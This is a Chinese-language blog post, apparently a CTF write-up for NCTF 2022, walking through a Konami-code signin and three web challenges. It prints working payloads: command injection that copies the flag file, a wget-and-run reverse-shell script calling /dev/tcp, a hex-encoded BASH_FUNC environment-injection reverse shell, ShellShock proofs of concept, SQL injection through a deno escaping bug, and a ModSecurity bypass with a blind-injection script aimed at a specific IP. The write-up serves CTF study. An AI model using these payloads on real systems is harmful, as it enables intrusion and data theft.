@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="2022NCTF部分wp" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            2022NCTF部分wp
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Misc"><span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Signin"><span class="post-toc-text">Signin</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#calc"><span class="post-toc-text">calc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="post-toc-text">非预期</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%A4%8D%E5%88%B6flag%E6%96%87%E4%BB%B6%E5%88%B0static%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="post-toc-text">复制flag文件到static文件夹</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="post-toc-text">反弹shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3%E3%80%90calc-revenge%E3%80%91"><span class="post-toc-text">预期解【calc_revenge】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="post-toc-text">变量覆盖</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E7%BB%95%E8%BF%87waf"><span class="post-toc-text">绕过waf</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ez-sql"><span class="post-toc-text">ez_sql</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ez-bypass"><span class="post-toc-text">ez_bypass</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#payload1"><span class="post-toc-text">payload1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#payload2"><span class="post-toc-text">payload2</span></a></li></ol></li></ol></li></ol>
+            
+        
+        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><blockquote>
+<p>程序设计实验作业,但是签到题(听zys说建议把终端字体调小一点并且只需要输入一串来自35年前的神秘秘籍</p>
+</blockquote>
+<p>35年前的秘籍，就是魂斗罗的秘籍</p>
+<p><strong>上、上、下、下、左、右、左、右、B、A、B、A</strong></p>
+<p>就可以得到flag</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212031511974.png" alt="image-20221203151055783"></p>
+<p><code>NCTF&#123;VVe1c0m3_T0_NCTF_2022!!!&#125;</code></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><ul>
+<li>命令注入</li>
+<li>环境变量注入</li>
+</ul>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050836661.png" alt="image-20221205083628550"></p>
+<p>网页源码里有提示<code>/source</code>,得到源码</p>
+<pre><code class="python">    @app.route(&quot;/calc&quot;,methods=[&#39;GET&#39;])
+def calc():
+    ip = request.remote_addr
+    num = request.values.get(&quot;num&quot;)
+    log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)
+    
+    if waf(num):
+        try:
+            data = eval(num)
+            os.system(log)
+        except:
+            pass
+        return str(data)
+    else:
+        return &quot;waf!!&quot;
+    
+</code></pre>
+<p>得知这里有waf，通过报错页面可以得到waf的内容<img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050846791.png" alt="image-20221205084607722"></p>
+<pre><code class="python">def waf(s):
+    blacklist = [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39;#&#39;,&#39;@&#39;,&#39;^&#39;,&#39;$&#39;,&#39;,&#39;,&#39;&gt;&#39;,&#39;?&#39;,&#39;`&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]
+    flag = True
+    for no in blacklist:
+        if no.lower() in s.lower():
+            flag= False
+            print(no)
+            break
+    return flag
+</code></pre>
+<p>这里是走<strong>os.system()利用换行来执行多条命令</strong></p>
+<p>但是要先让eval()执行成功才能走到os.system</p>
+<p>所以要用’’’来表示python的多行代码，同时os.system执行第一条执行成功后才会执行第二条命令，所以要加一个’来闭合前面的’’’，结尾同理</p>
+<p>用%09来替代空格</p>
+<p>这里有两种方法</p>
+<h4 id="复制flag文件到static文件夹"><a href="#复制flag文件到static文件夹" class="headerlink" title="复制flag文件到static文件夹"></a>复制flag文件到static文件夹</h4><p>static文件夹是flask的静态文件夹，我们是可以访问到的</p>
+<p>而且在报错页面也可以知道app.py的运行目录</p>
+<p>payload:</p>
+<pre><code class="bash">GET: /calc?num=&#39;&#39;&#39;w&#39;%0acp%09/*f*%09/home/static/v2%0a&#39;123&#39;&#39;&#39;#f也可以换成大写试一下
+</code></pre>
+<p>这条代码执行后的log是</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050923066.png" alt="image-20221205092316035"></p>
+<p>然后在&#x2F;static&#x2F;v2下载就行</p>
+<blockquote>
+<p>但是如果有坏b把flag文件弄走了就没办法了</p>
+</blockquote>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>因为反弹shell的命令里有被ban的字符，可以先把命令下载下来，然后再去执行他</p>
+<p>v2.sh</p>
+<pre><code class="sh">#! /bin/bash
+bash -c &#39; bash -i &amp;&gt; /dev/tcp/&#123;vpshost&#125;/&#123;vpsport&#125; 0&gt;&amp;1&#39;
+</code></pre>
+<p>payload</p>
+<pre><code class="bash">GET: /calc?num=&#39;&#39;&#39;w&#39;%0awget%09&#123;vpshost&#125;/v2.sh%0a&#39;123&#39;&#39;&#39;
+GET: /calc?num=&#39;&#39;&#39;w&#39;%0abash%09v2.sh%0a&#39;123&#39;&#39;&#39;
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212051006921.png" alt="image-20221205100635894"></p>
+<hr>
+<p>原来我上面写的是非预期XD</p>
+<h3 id="预期解【calc-revenge】"><a href="#预期解【calc-revenge】" class="headerlink" title="预期解【calc_revenge】"></a>预期解【<strong>calc_revenge</strong>】</h3><p>出题师傅的预期解是利用环境变量注入来执行命令，这里涉及到p佬的一篇文章<a target="_blank" rel="noopener" href="https://tttang.com/archive/1450/#toc_0x01-ld_preload">我是如何利用环境变量注入执行任意命令</a></p>
+<p>这里是因为python3的os.system()也是利用&#x2F;bin&#x2F;sh -c 来执行的</p>
+<p>在subproccess.py文件中</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212082335699.png" alt="image-20221208232726462"></p>
+<p>所以可以使用环境变量进行注入</p>
+<p>p佬文章中的三个poc</p>
+<blockquote>
+<ul>
+<li>Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如<code>TEST=() &#123; :; &#125;; id;</code></li>
+<li>Bash 4.4以前：<code>env $&#39;BASH_FUNC_echo()=() &#123; id; &#125;&#39; bash -c &quot;echo hello&quot;</code></li>
+<li>Bash 4.4及以上：<code>env $&#39;BASH_FUNC_echo%%=() &#123; id; &#125;&#39; bash -c &#39;echo hello&#39;</code></li>
+</ul>
+<p>在CentOS系系统下完美解决本文开头提到的问题，通杀所有Bash。</p>
+</blockquote>
+<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>接下来就是进行环境变量的覆盖，因为python的环境变量是以字典的形式存在的</p>
+<p>可以使用python的list生成器和中括号进行变量覆盖</p>
+<pre><code class="python">a=&#123;&quot;aaa&quot;:&#39;123&#39;&#125;
+[[str][0]for[a[&#39;aaa&#39;]]in[[&#39;111&#39;]]]
+print(a)
+#&#123;&#39;aaa&#39;: &#39;111&#39;&#125;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">Python黑魔法-绕过空格实现变量覆盖</a>(这篇文章中有写过原理，但是使用这里面的方式成功不了，本地都无法执行)</p>
+<p>然后就是进行覆盖了，一个个试poc</p>
+<h4 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h4><p>在引号包裹中的字符可以使用绕过，16进制或者unicode编码都行</p>
+<p>然后就是绕过os，这个没有被引号包裹的字符</p>
+<p>这里直接使用Pupi1师傅的文字</p>
+<blockquote>
+<p>但实际上python是支持Non-ASCII Identifies也就是说可以使用unicode字符的，具体参考见: <a target="_blank" rel="noopener" href="https://peps.python.org/pep-3131/">https://peps.python.org/pep-3131/</a> ，也就是说如果我们使用了UTF-8中的非ASCII码作为标识符，那么其会被函数转换为NFKC标准格式，也就是说我们可以使用例如<code>ᵒ</code>来代替<code>o</code>，从而绕过限制。</p>
+</blockquote>
+<p>最终的payload：</p>
+<pre><code class="python">[[str][0]for[ᵒs.environ[&#39;BASH\x5fFUNC\x5fecho%%&#39;]]in[[&#39;\x28\x29\x20\x7b\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x78\x2e\x78\x78\x2e\x78\x78\x2e\x78\x78\x2f\x78\x78\x78\x78\x20\x30\x3e\x26\x31\x3b\x7d&#39;]]]
+#() &#123; bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1;&#125;
+</code></pre>
+<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><ul>
+<li>deno的bug</li>
+</ul>
+<p>这个在hack.lu ctf中出现过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/">foodAPI</a></p>
+<p>在后面多传一个?参数就会造成bug，从而导致注入</p>
+<p>摘自HuLi的博客:</p>
+<blockquote>
+<p>但是deno 的lib 忘记对栏位名称的 <code>?</code> 做escape 了，所以如果你传：<code>&#123;&quot;id&quot;:&quot;1&quot;, &quot;?&quot;: &quot;A&quot;&#125;</code>，最后出来的SQL 会是：</p>
+<pre><code>select * from  `food`  where  `id` =? and  `?` =?
+</code></pre>
+<p>而bind 完之后就会变成：</p>
+<pre><code>select * from  `food`  where  `id` = &#39;1&#39;  and  `&#39;A&#39;` =?
+</code></pre>
+<p>你会发现A 那边可以做SQL injection，只要先闭合那个反引号就行了。</p>
+<p>但问题是这样会产生不合法的栏位名称，因为里面一定有个单引号，像这样：</p>
+<pre><code>select * from  `food`  where  `id` = &#39;1&#39;  and  `&#39;name` --&#39;=?
+</code></pre>
+<p>会出现：</p>
+<p>Error: no such column: ‘name</p>
+</blockquote>
+<p>然后使用下面的闭合方式可以绕过不存在的字段名</p>
+<pre><code class="sql">select  id  from food where  `&#39;not_exist&#39;`  and  0  union  select  1 ; 
+select  id  from food where  `&#39;not_exist&#39;`  in () union  select  1 ;
+</code></pre>
+<p>payload：</p>
+<pre><code>GET: /flight?id=1&amp;?=`+and+0+union+select+1,flag+from+flag --
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212142232562.png" alt="image-20221205170802842"></p>
+<h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><ul>
+<li>modsecurity bypass</li>
+</ul>
+<h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>给出的hint里知道waf用的是modsecurity</p>
+<blockquote>
+<p>ModSecurity是一个开源的、跨平台的Web应用防火墙（WAF），被称为WAF界的“瑞士军刀”。它可以通过检查Web服务接收到的数据，以及发送出去的数据来对网站进行安全防护</p>
+</blockquote>
+<p>在网上搜bypass方法</p>
+<p><a target="_blank" rel="noopener" href="https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html">https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html</a></p>
+<p>modsecurity是利用<code>Libinjection</code>进行语义分析，所以常规的and，or，||，&amp;&amp;都不能用了作为连接符</p>
+<p>这里使用<code>^</code>（异或）来连接两个语句从而进行注入</p>
+<pre><code class="bash">GET: /sql.php?id=1^(1.e(ascii 1.e(substring(1.e(select password from users.info where id=1) 1.e,&#123;&#125; 1.e,1 1.e)1.e)1.e)=&#123;&#125;)
+</code></pre>
+<p>当正确的时候，页面不会有回显</p>
+<p>利用脚本进行盲注</p>
+<pre><code class="python">import requests
+import time
+url=&quot;http://121.37.11.207:8099/sql.php?id=&quot;
+
+payload1=&quot;1^(1.e(ascii 1.e(substring(1.e(select password from users.info where id=1) 1.e,&#123;&#125; 1.e,1 1.e)1.e)1.e)=&#123;&#125;)&quot;
+result=&#39;&#39;
+for x in range(1,43):
+    for i in range(32,128):
+        url_end=url+payload1.format(x,i)
+        res=requests.get(url_end)
+        if &quot;letian&quot; not in res.text:
+            result+=chr(i)
+            print(result)
+            break
+</code></pre>
+<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>利用这篇文章的payload<a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1727">https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1727</a></p>
+<pre><code class="bash">http://121.37.11.207:8099/sql.php?id=@.:=right(right((select hex(password) from users.info limit 0,1),1111),1111) union%23%0adistinctrow%0bselect@.
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212142233229.png" alt="image-20221205192932575"></p>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-03</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/CTF/'>
+                            CTF
+                        </a>
+                    
+                        <a href='/tags/WEB/'>
+                            WEB
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
